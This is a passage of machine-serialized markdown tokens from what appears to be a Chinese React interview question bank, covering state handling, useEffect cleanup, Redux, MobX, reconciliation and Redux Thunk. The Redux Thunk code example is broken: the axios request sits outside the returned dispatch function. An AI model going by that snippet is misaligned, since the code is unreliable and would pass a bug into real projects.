是修改其中的部分状态，相当于 Object.assign，只是覆盖，不会减少原来的状态。而replaceState 是完全替换原来的状态，相当于赋值，将原来的 state 替换为另一个对象，如果新状态属性减少，那么 state 中就没有这个状态了。","text":"总结： setState 是修改其中的部分状态，相当于 Object.assign，只是覆盖，不会减少原来的状态。而replaceState 是完全替换原来的状态，相当于赋值，将原来的 state 替换为另一个对象，如果新状态属性减少，那么 state 中就没有这个状态了。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 51. 在React中组件的this.state和setState有什么区别？\\n\\n","depth":2,"text":"51. 在React中组件的this.state和setState有什么区别？","tokens":[{"type":"text","raw":"51. 在React中组件的this.state和setState有什么区别？","text":"51. 在React中组件的this.state和setState有什么区别？","escaped":false}]},{"type":"heading","raw":"#### 类型：`编程`\\n\\n","depth":4,"text":"类型：`编程`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`编程`","text":"编程"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"paragraph","raw":"this.state通常是用来初始化state的，this.setState是用来修改state值的。如果初始化了state之后再使用this.state，之前的state会被覆盖掉，如果使用this.setState，只会替换掉相应的state值。所以，如果想要修改state的值，就需要使用setState，而不能直接修改state，直接修改state之后页面是不会更新的。","text":"this.state通常是用来初始化state的，this.setState是用来修改state值的。如果初始化了state之后再使用this.state，之前的state会被覆盖掉，如果使用this.setState，只会替换掉相应的state值。所以，如果想要修改state的值，就需要使用setState，而不能直接修改state，直接修改state之后页面是不会更新的。","tokens":[{"type":"text","raw":"this.state通常是用来初始化state的，this.setState是用来修改state值的。如果初始化了state之后再使用this.state，之前的state会被覆盖掉，如果使用this.setState，只会替换掉相应的state值。所以，如果想要修改state的值，就需要使用setState，而不能直接修改state，直接修改state之后页面是不会更新的。","text":"this.state通常是用来初始化state的，this.setState是用来修改state值的。如果初始化了state之后再使用this.state，之前的state会被覆盖掉，如果使用this.setState，只会替换掉相应的state值。所以，如果想要修改state的值，就需要使用setState，而不能直接修改state，直接修改state之后页面是不会更新的。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 52. 如何跟踪功能组件的卸载？\\n\\n","depth":2,"text":"52. 如何跟踪功能组件的卸载？","tokens":[{"type":"text","raw":"52. 如何跟踪功能组件的卸载？","text":"52. 如何跟踪功能组件的卸载？","escaped":false}]},{"type":"heading","raw":"#### 类型：`编程`\\n\\n","depth":4,"text":"类型：`编程`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`编程`","text":"编程"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"paragraph","raw":"通常，useEffect 创建的资源需要在组件离开屏幕前进行清理或重置，例如订阅或计时器标识符。\\n为此，传递给 useEffect 的函数可以返回一个清理函数。清理函数将在组件从用户界面移除之前运行，以防止内存泄漏。此外，如果组件渲染多次（通常是这种情况），则会在执行下一个效果之前清理前一个效果。","text":"通常，useEffect 创建的资源需要在组件离开屏幕前进行清理或重置，例如订阅或计时器标识符。\\n为此，传递给 useEffect 的函数可以返回一个清理函数。清理函数将在组件从用户界面移除之前运行，以防止内存泄漏。此外，如果组件渲染多次（通常是这种情况），则会在执行下一个效果之前清理前一个效果。","tokens":[{"type":"text","raw":"通常，useEffect 创建的资源需要在组件离开屏幕前进行清理或重置，例如订阅或计时器标识符。\\n为此，传递给 useEffect 的函数可以返回一个清理函数。清理函数将在组件从用户界面移除之前运行，以防止内存泄漏。此外，如果组件渲染多次（通常是这种情况），则会在执行下一个效果之前清理前一个效果。","text":"通常，useEffect 创建的资源需要在组件离开屏幕前进行清理或重置，例如订阅或计时器标识符。\\n为此，传递给 useEffect 的函数可以返回一个清理函数。清理函数将在组件从用户界面移除之前运行，以防止内存泄漏。此外，如果组件渲染多次（通常是这种情况），则会在执行下一个效果之前清理前一个效果。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nuseEffect(() => {\\n  function handleChange(value) {\\n    setValue(value);\\n  }\\n  SomeAPI.doFunction(id, handleChange);\\n\\n  return function cleanup() {\\n    SomeAPI.undoFunction(id, handleChange);\\n  };\\n})\\n\\n```","lang":"js","text":"useEffect(() => {\\n  function handleChange(value) {\\n    setValue(value);\\n  }\\n  SomeAPI.doFunction(id, handleChange);\\n\\n  return function cleanup() {\\n    SomeAPI.undoFunction(id, handleChange);\\n  };\\n})\\n"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 53. 什么是状态管理器？你使用或了解哪些状态管理器？\\n\\n","depth":2,"text":"53. 什么是状态管理器？你使用或了解哪些状态管理器？","tokens":[{"type":"text","raw":"53. 什么是状态管理器？你使用或了解哪些状态管理器？","text":"53. 什么是状态管理器？你使用或了解哪些状态管理器？","escaped":false}]},{"type":"heading","raw":"#### 类型：`编程`\\n\\n","depth":4,"text":"类型：`编程`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`编程`","text":"编程"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"paragraph","raw":"状态管理器是一种帮助管理应用程序状态的工具或库。它为存储和管理数据提供了一个集中的存储空间或容器，应用程序中的不同组件都可以访问和更新这些数据。\\n状态管理器可以解决几个问题。首先，将数据和与之相关的逻辑从组件中分离出来是一种很好的做法。其次，当使用本地状态并在组件之间传递时，由于组件有可能深嵌套，代码可能会变得错综复杂。通过全局存储，我们可以从任何组件访问和修改数据。\\n除了 React Context，Redux 或 MobX 也常用作状态管理库。","text":"状态管理器是一种帮助管理应用程序状态的工具或库。它为存储和管理数据提供了一个集中的存储空间或容器，应用程序中的不同组件都可以访问和更新这些数据。\\n状态管理器可以解决几个问题。首先，将数据和与之相关的逻辑从组件中分离出来是一种很好的做法。其次，当使用本地状态并在组件之间传递时，由于组件有可能深嵌套，代码可能会变得错综复杂。通过全局存储，我们可以从任何组件访问和修改数据。\\n除了 React Context，Redux 或 MobX 也常用作状态管理库。","tokens":[{"type":"text","raw":"状态管理器是一种帮助管理应用程序状态的工具或库。它为存储和管理数据提供了一个集中的存储空间或容器，应用程序中的不同组件都可以访问和更新这些数据。\\n状态管理器可以解决几个问题。首先，将数据和与之相关的逻辑从组件中分离出来是一种很好的做法。其次，当使用本地状态并在组件之间传递时，由于组件有可能深嵌套，代码可能会变得错综复杂。通过全局存储，我们可以从任何组件访问和修改数据。\\n除了 React Context，Redux 或 MobX 也常用作状态管理库。","text":"状态管理器是一种帮助管理应用程序状态的工具或库。它为存储和管理数据提供了一个集中的存储空间或容器，应用程序中的不同组件都可以访问和更新这些数据。\\n状态管理器可以解决几个问题。首先，将数据和与之相关的逻辑从组件中分离出来是一种很好的做法。其次，当使用本地状态并在组件之间传递时，由于组件有可能深嵌套，代码可能会变得错综复杂。通过全局存储，我们可以从任何组件访问和修改数据。\\n除了 React Context，Redux 或 MobX 也常用作状态管理库。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 54. 在什么情况下可以使用本地状态，什么时候应该使用全局状态？\\n\\n","depth":2,"text":"54. 在什么情况下可以使用本地状态，什么时候应该使用全局状态？","tokens":[{"type":"text","raw":"54. 在什么情况下可以使用本地状态，什么时候应该使用全局状态？","text":"54. 在什么情况下可以使用本地状态，什么时候应该使用全局状态？","escaped":false}]},{"type":"heading","raw":"#### 类型：`编程`\\n\\n","depth":4,"text":"类型：`编程`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`编程`","text":"编程"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"paragraph","raw":"如果本地状态仅在一个组件中使用并且不打算将其传递给其他组件，则建议使用本地状态。本地状态也用在表示列表中单个项目的组件中。但是，如果组件分解涉及嵌套组件且数据沿层次结构传递，则最好使用全局状态。","text":"如果本地状态仅在一个组件中使用并且不打算将其传递给其他组件，则建议使用本地状态。本地状态也用在表示列表中单个项目的组件中。但是，如果组件分解涉及嵌套组件且数据沿层次结构传递，则最好使用全局状态。","tokens":[{"type":"text","raw":"如果本地状态仅在一个组件中使用并且不打算将其传递给其他组件，则建议使用本地状态。本地状态也用在表示列表中单个项目的组件中。但是，如果组件分解涉及嵌套组件且数据沿层次结构传递，则最好使用全局状态。","text":"如果本地状态仅在一个组件中使用并且不打算将其传递给其他组件，则建议使用本地状态。本地状态也用在表示列表中单个项目的组件中。但是，如果组件分解涉及嵌套组件且数据沿层次结构传递，则最好使用全局状态。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 55. Redux 实现了哪种模式？\\n\\n","depth":2,"text":"55. Redux 实现了哪种模式？","tokens":[{"type":"text","raw":"55. Redux 实现了哪种模式？","text":"55. Redux 实现了哪种模式？","escaped":false}]},{"type":"heading","raw":"#### 类型：`编程`\\n\\n","depth":4,"text":"类型：`编程`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`编程`","text":"编程"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"paragraph","raw":"Redux 实现了Flux 模式，它是应用程序的可预测状态管理模式。它通过引入单向数据流和应用程序状态的集中存储来帮助管理应用程序的状态。","text":"Redux 实现了Flux 模式，它是应用程序的可预测状态管理模式。它通过引入单向数据流和应用程序状态的集中存储来帮助管理应用程序的状态。","tokens":[{"type":"text","raw":"Redux 实现了Flux 模式，它是应用程序的可预测状态管理模式。它通过引入单向数据流和应用程序状态的集中存储来帮助管理应用程序的状态。","text":"Redux 实现了Flux 模式，它是应用程序的可预测状态管理模式。它通过引入单向数据流和应用程序状态的集中存储来帮助管理应用程序的状态。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 56. 使用 Mobx 的特点是什么？\\n\\n","depth":2,"text":"56. 使用 Mobx 的特点是什么？","tokens":[{"type":"text","raw":"56. 使用 Mobx 的特点是什么？","text":"56. 使用 Mobx 的特点是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`编程`\\n\\n","depth":4,"text":"类型：`编程`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`编程`","text":"编程"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"paragraph","raw":"Mobx 提供了类似observable和的装饰器computed来定义可观察的状态和反应函数。用action修饰的动作用于修改状态，确保跟踪所有更改。Mobx 还提供自动依赖跟踪、不同类型的反应、对反应性的细粒度控制，以及通过 mobx-react 包与 React 无缝集成。总体而言，Mobx 通过根据可观察状态的变化自动执行更新过程来简化状态管理。","text":"Mobx 提供了类似observable和的装饰器computed来定义可观察的状态和反应函数。用action修饰的动作用于修改状态，确保跟踪所有更改。Mobx 还提供自动依赖跟踪、不同类型的反应、对反应性的细粒度控制，以及通过 mobx-react 包与 React 无缝集成。总体而言，Mobx 通过根据可观察状态的变化自动执行更新过程来简化状态管理。","tokens":[{"type":"text","raw":"Mobx 提供了类似observable和的装饰器computed来定义可观察的状态和反应函数。用action修饰的动作用于修改状态，确保跟踪所有更改。Mobx 还提供自动依赖跟踪、不同类型的反应、对反应性的细粒度控制，以及通过 mobx-react 包与 React 无缝集成。总体而言，Mobx 通过根据可观察状态的变化自动执行更新过程来简化状态管理。","text":"Mobx 提供了类似observable和的装饰器computed来定义可观察的状态和反应函数。用action修饰的动作用于修改状态，确保跟踪所有更改。Mobx 还提供自动依赖跟踪、不同类型的反应、对反应性的细粒度控制，以及通过 mobx-react 包与 React 无缝集成。总体而言，Mobx 通过根据可观察状态的变化自动执行更新过程来简化状态管理。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 57. Redux和Mobx有什么区别？\\n\\n","depth":2,"text":"57. Redux和Mobx有什么区别？","tokens":[{"type":"text","raw":"57. Redux和Mobx有什么区别？","text":"57. Redux和Mobx有什么区别？","escaped":false}]},{"type":"heading","raw":"#### 类型：`编程`\\n\\n","depth":4,"text":"类型：`编程`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`编程`","text":"编程"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- Redux 是一种更简单、更有主见的状态管理库，它遵循严格的单向数据流，并提倡不变性。它需要更多的模板代码和显式更新，但与 React 的集成度很高。\\n\\n- Mobx 提供的 API 更灵活、更直观，模板代码更少。它允许你直接修改状态，并自动跟踪变化以获得更好的性能。在 Redux 和 Mobx 之间做出选择取决于您的具体需求和偏好。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- Redux 是一种更简单、更有主见的状态管理库，它遵循严格的单向数据流，并提倡不变性。它需要更多的模板代码和显式更新，但与 React 的集成度很高。\\n\\n","task":false,"loose":true,"text":"Redux 是一种更简单、更有主见的状态管理库，它遵循严格的单向数据流，并提倡不变性。它需要更多的模板代码和显式更新，但与 React 的集成度很高。\\n","tokens":[{"type":"text","raw":"Redux 是一种更简单、更有主见的状态管理库，它遵循严格的单向数据流，并提倡不变性。它需要更多的模板代码和显式更新，但与 React 的集成度很高。\\n","text":"Redux 是一种更简单、更有主见的状态管理库，它遵循严格的单向数据流，并提倡不变性。它需要更多的模板代码和显式更新，但与 React 的集成度很高。","tokens":[{"type":"text","raw":"Redux 是一种更简单、更有主见的状态管理库，它遵循严格的单向数据流，并提倡不变性。它需要更多的模板代码和显式更新，但与 React 的集成度很高。","text":"Redux 是一种更简单、更有主见的状态管理库，它遵循严格的单向数据流，并提倡不变性。它需要更多的模板代码和显式更新，但与 React 的集成度很高。","escaped":false}]}]},{"type":"list_item","raw":"- Mobx 提供的 API 更灵活、更直观，模板代码更少。它允许你直接修改状态，并自动跟踪变化以获得更好的性能。在 Redux 和 Mobx 之间做出选择取决于您的具体需求和偏好。","task":false,"loose":true,"text":"Mobx 提供的 API 更灵活、更直观，模板代码更少。它允许你直接修改状态，并自动跟踪变化以获得更好的性能。在 Redux 和 Mobx 之间做出选择取决于您的具体需求和偏好。","tokens":[{"type":"text","raw":"Mobx 提供的 API 更灵活、更直观，模板代码更少。它允许你直接修改状态，并自动跟踪变化以获得更好的性能。在 Redux 和 Mobx 之间做出选择取决于您的具体需求和偏好。","text":"Mobx 提供的 API 更灵活、更直观，模板代码更少。它允许你直接修改状态，并自动跟踪变化以获得更好的性能。在 Redux 和 Mobx 之间做出选择取决于您的具体需求和偏好。","tokens":[{"type":"text","raw":"Mobx 提供的 API 更灵活、更直观，模板代码更少。它允许你直接修改状态，并自动跟踪变化以获得更好的性能。在 Redux 和 Mobx 之间做出选择取决于您的具体需求和偏好。","text":"Mobx 提供的 API 更灵活、更直观，模板代码更少。它允许你直接修改状态，并自动跟踪变化以获得更好的性能。在 Redux 和 Mobx 之间做出选择取决于您的具体需求和偏好。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 58. 什么是React调和？\\n\\n","depth":2,"text":"58. 什么是React调和？","tokens":[{"type":"text","raw":"58. 什么是React调和？","text":"58. 什么是React调和？","escaped":false}]},{"type":"heading","raw":"#### 类型：`编程`\\n\\n","depth":4,"text":"类型：`编程`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`编程`","text":"编程"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- 调和是 React 的一种算法，用于区分一棵元素树和另一棵元素树，以确定需要替换的部分。\\n调和是我们过去所说的虚拟 DOM 背后的算法。其定义听起来是这样的：当您渲染 React 应用程序时，描述应用程序的元素树会在预留内存中生成。然后，这棵树就会被包含在呈现环境中，例如，在浏览器应用程序中，它会被转化为一组 DOM 操作。应用状态更新时，会生成新的元素树。新的树会与之前的树进行比较，以便准确计算和启用重新绘制更新后的应用程序所需的操作。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- 调和是 React 的一种算法，用于区分一棵元素树和另一棵元素树，以确定需要替换的部分。\\n调和是我们过去所说的虚拟 DOM 背后的算法。其定义听起来是这样的：当您渲染 React 应用程序时，描述应用程序的元素树会在预留内存中生成。然后，这棵树就会被包含在呈现环境中，例如，在浏览器应用程序中，它会被转化为一组 DOM 操作。应用状态更新时，会生成新的元素树。新的树会与之前的树进行比较，以便准确计算和启用重新绘制更新后的应用程序所需的操作。","task":false,"loose":false,"text":"调和是 React 的一种算法，用于区分一棵元素树和另一棵元素树，以确定需要替换的部分。\\n调和是我们过去所说的虚拟 DOM 背后的算法。其定义听起来是这样的：当您渲染 React 应用程序时，描述应用程序的元素树会在预留内存中生成。然后，这棵树就会被包含在呈现环境中，例如，在浏览器应用程序中，它会被转化为一组 DOM 操作。应用状态更新时，会生成新的元素树。新的树会与之前的树进行比较，以便准确计算和启用重新绘制更新后的应用程序所需的操作。","tokens":[{"type":"text","raw":"调和是 React 的一种算法，用于区分一棵元素树和另一棵元素树，以确定需要替换的部分。\\n\\n调和是我们过去所说的虚拟 DOM 背后的算法。其定义听起来是这样的：当您渲染 React 应用程序时，描述应用程序的元素树会在预留内存中生成。然后，这棵树就会被包含在呈现环境中，例如，在浏览器应用程序中，它会被转化为一组 DOM 操作。应用状态更新时，会生成新的元素树。新的树会与之前的树进行比较，以便准确计算和启用重新绘制更新后的应用程序所需的操作。","text":"调和是 React 的一种算法，用于区分一棵元素树和另一棵元素树，以确定需要替换的部分。\\n调和是我们过去所说的虚拟 DOM 背后的算法。其定义听起来是这样的：当您渲染 React 应用程序时，描述应用程序的元素树会在预留内存中生成。然后，这棵树就会被包含在呈现环境中，例如，在浏览器应用程序中，它会被转化为一组 DOM 操作。应用状态更新时，会生成新的元素树。新的树会与之前的树进行比较，以便准确计算和启用重新绘制更新后的应用程序所需的操作。","tokens":[{"type":"text","raw":"调和是 React 的一种算法，用于区分一棵元素树和另一棵元素树，以确定需要替换的部分。\\n调和是我们过去所说的虚拟 DOM 背后的算法。其定义听起来是这样的：当您渲染 React 应用程序时，描述应用程序的元素树会在预留内存中生成。然后，这棵树就会被包含在呈现环境中，例如，在浏览器应用程序中，它会被转化为一组 DOM 操作。应用状态更新时，会生成新的元素树。新的树会与之前的树进行比较，以便准确计算和启用重新绘制更新后的应用程序所需的操作。","text":"调和是 React 的一种算法，用于区分一棵元素树和另一棵元素树，以确定需要替换的部分。\\n调和是我们过去所说的虚拟 DOM 背后的算法。其定义听起来是这样的：当您渲染 React 应用程序时，描述应用程序的元素树会在预留内存中生成。然后，这棵树就会被包含在呈现环境中，例如，在浏览器应用程序中，它会被转化为一组 DOM 操作。应用状态更新时，会生成新的元素树。新的树会与之前的树进行比较，以便准确计算和启用重新绘制更新后的应用程序所需的操作。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 59. 如何在 Redux Thunk 中处理异步操作？\\n\\n","depth":2,"text":"59. 如何在 Redux Thunk 中处理异步操作？","tokens":[{"type":"text","raw":"59. 如何在 Redux Thunk 中处理异步操作？","text":"59. 如何在 Redux Thunk 中处理异步操作？","escaped":false}]},{"type":"heading","raw":"#### 类型：`编程`\\n\\n","depth":4,"text":"类型：`编程`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`编程`","text":"编程"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"paragraph","raw":"要使用 Redux Thunk，需要将其作为中间件导入。Action创建者不应只返回一个对象，而应返回一个将dispatch 作为参数的函数。","text":"要使用 Redux Thunk，需要将其作为中间件导入。Action创建者不应只返回一个对象，而应返回一个将dispatch 作为参数的函数。","tokens":[{"type":"text","raw":"要使用 Redux Thunk，需要将其作为中间件导入。Action创建者不应只返回一个对象，而应返回一个将dispatch 作为参数的函数。","text":"要使用 Redux Thunk，需要将其作为中间件导入。Action创建者不应只返回一个对象，而应返回一个将dispatch 作为参数的函数。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nexport const addUser = ({ firstName, lastName }) => {\\n  return dispatch => {\\n    dispatch(addUserStart());\\n  }\\n\\n  axios.post(\'https://jsonplaceholder.typicode.com/users\', {\\n    firstName,\\n    lastName,\\n    completed: false\\n  })\\n  .then(res => {\\n    dispatch(addUserSuccess(res.data));\\n  })\\n  .catch(error => {\\n    dispatch(addUserError(error.message));\\n  })\\n}\\n```","lang":"js","text":"export const addUser = ({ firstName, lastName }) => {\\n  return dispatch => {\\n    dispatch(addUserStart());\\n  }\\n\\n  axios.post(\'https://jsonplaceholder.typicode.com/users\', {\\n    firstName,\\n    lastName,\\n    completed: false\\n  })\\n  .then(res => {\\n    dispatch(addUserSuccess(res.data));\\n  })\\n  .catch(error => {\\n    dispatch(addUserError(error.message));\\n  })\\n}"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 60. 如何跟踪功能组件中对象字段的变化？\\n\\n","depth":2,"text":"60. 如何跟踪功能组件中对象字段的变化？","tokens":[{"type":"text","raw":"60. 如何跟踪功能组件中对象字段的变化？","text":"60. 如何跟踪功能组件中对象字段的变化？","escaped":false}]},{"type":"heading","raw":"#### 类型：`编程`\\n\\n","depth":4,"text":"类型：`编程`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`编程`","text":"编程"}]},{"type":"heading","raw":"#### 